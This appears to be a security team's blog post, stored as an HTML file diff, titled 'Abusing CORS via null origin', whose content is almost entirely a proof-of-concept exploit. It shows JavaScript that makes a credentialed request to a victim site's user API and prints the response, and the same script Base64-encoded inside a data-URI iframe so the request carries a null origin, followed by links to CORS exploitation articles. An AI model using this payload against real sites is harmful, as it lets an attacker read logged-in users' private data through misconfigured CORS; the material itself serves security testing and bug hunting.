@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="">
+	<meta charset="UTF-8">
+<!-- <link rel="icon" type="image/x-icon" href="/statics/img/favicon.ico"> -->
+<title>
+	
+		Abusing CORS via null origin -
+	
+	Symbo1
+</title>
+
+<meta name="theme-color" content="#232323">
+<meta name="description" content="Symbo1 Security Team Post.">
+<meta name="keywords" content="">
+<meta name="author" content="Tr3jer_CongRong.">
+<link rel="alternate" type="application/rss+xml" title="Symbo1's RSS Feed" href="/feed.xml">
+<link rel="stylesheet" type="text/css" href="/statics/css/style.css">
+
+
+
+	<body>
+		<header>
+	<pre class="ascii name">
+  ____                        _               _ 
+ / ___|   _   _   _ __ ___   | |__     ___   / |
+ \___ \  | | | | | '_ ` _ \  | '_ \   / _ \  | |
+  ___) | | |_| | | | | | | | | |_) | | (_) | | |
+ |____/   \__, | |_| |_| |_| |_.__/   \___/  |_|
+          |___/                                 
+          	Security Team.
+	</pre>
+</header>
+		<nav>
+	<ul>
+		<li><a href="/">Index</a></li>&nbsp;&nbsp;|
+		<li><a href="/acknowledgement">Acknowledgement</a></li>&nbsp;&nbsp;|
+		<li><a href="/archives">Archives</a></li>&nbsp;&nbsp;|
+		<li><a href="http://github.com/symbo1" target="_blank">Projects</a></li>&nbsp;&nbsp;|
+		<li><a href="/members">Members</a></li>&nbsp;&nbsp;|
+		<li><a href="/about">About</a></li>
+	</ul>
+</nav>
+
+		<main>
+			<style>
+	body{
+		word-break:break-word;
+	}
+</style>
+
+<div class="post-content">
+<div id="post">
+<h1 align="center">Abusing CORS via null origin</h1>
+<!-- <link rel="stylesheet" type="text/css" href="/statics/css/syntax.css"> -->
+  <p align="right" class="date">04 Jul 2018 - onehackzero</p>
+
+<h2 id="poc">POC:</h2>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+    <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">"https://www.victim.com/api/getuser"</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+    <span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'get'</span><span class="p">,</span><span class="nx">url</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
+    <span class="nx">req</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">"Accept"</span><span class="p">,</span> <span class="s2">"application/json"</span><span class="p">);</span>
+    <span class="nx">req</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+    <span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span><span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="nx">req</span><span class="p">.</span><span class="nx">DONE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">)</span>
+    <span class="p">}}</span>
+ <span class="o">&lt;</span><span class="sr">/script&gt;</span></code></pre></figure>
+
+<p>This code was converted to the equivalent Base64 string.</p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">width</span><span class="o">=</span><span class="mi">100</span><span class="o">%</span> <span class="nx">height</span><span class="o">=</span><span class="mi">100</span><span class="o">%</span> <span class="nx">src</span><span class="o">=</span><span class="s2">"data:text/html;base64,PHNjcmlwdD4gdmFyIHVybCA9ICJodHRwczovL3d3dy52aWN0aW0uY29tL2FwaS9nZXR1c2VyIjsgIHZhciByZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtyZXEub3BlbignZ2V0Jyx1cmwsdHJ1ZSk7cmVxLnNldFJlcXVlc3RIZWFkZXIoIkFjY2VwdCIsICJhcHBsaWNhdGlvbi9qc29uIik7cmVxLndpdGhDcmVkZW50aWFscyA9IHRydWU7cmVxLnNlbmQoKTtyZXEub25yZWFkeXN0YXRlY2hhbmdlPSBmdW5jdGlvbigpe2lmKHJlcS5yZWFkeVN0YXRlID09IHJlcS5ET05FKSB7ZG9jdW1lbnQud3JpdGUodGhpcy5yZXNwb25zZVRleHQpfSB9PC9zY3JpcHQ+"</span><span class="o">&gt;</span></code></pre></figure>
+
+<h2 id="further-reading">Further reading:</h2>
+
+<p><a href="https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" target="_blank">Exploiting CORS misconfigurations for Bitcoins and bounties</a><br />
+<a href="https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/" target="_blank">Exploiting Misconfigured CORS (Cross Origin Resource Sharing)</a><br />
+<a href="https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-via-wildcard-subdomains" target="_blank">Exploiting Misconfigured CORS via Wildcard Subdomains</a><br />
+<a href="https://web-in-security.blogspot.com/2017/07/cors-misconfigurations-on-large-scale.html" target="_blank">CORS misconfigurations on a large scale</a><br />
+<a href="https://yassineaboukir.com/blog/cors-exploitation-data-exfiltration-when-allowed-origin-is-set-to-null/" target="_blank">CORS Exploitation: Data exfiltration when allowed origin is set to NULL</a><br />
+<a href="https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/" target="_blank">CORS Misconfigurations Explained</a><br />
+<a href="https://www.sxcurity.pro/advanced-cors-techniques/" target="_blank">Advanced CORS Exploitation Techniques</a><br /></p>
+
+</div>
+</div>
+		</main>
+		
+			<footer>
+	<div id="disqus_thread"></div>
+<script>
+
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://www-symbo1-com.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</footer>
+		
+		<div style="display: none;">
+        	<script src="https://s5.cnzz.com/z_stat.php?id=1275488238&web_id=1275488238" language="JavaScript"></script>
+    	</div>
+	</body>
+</html>
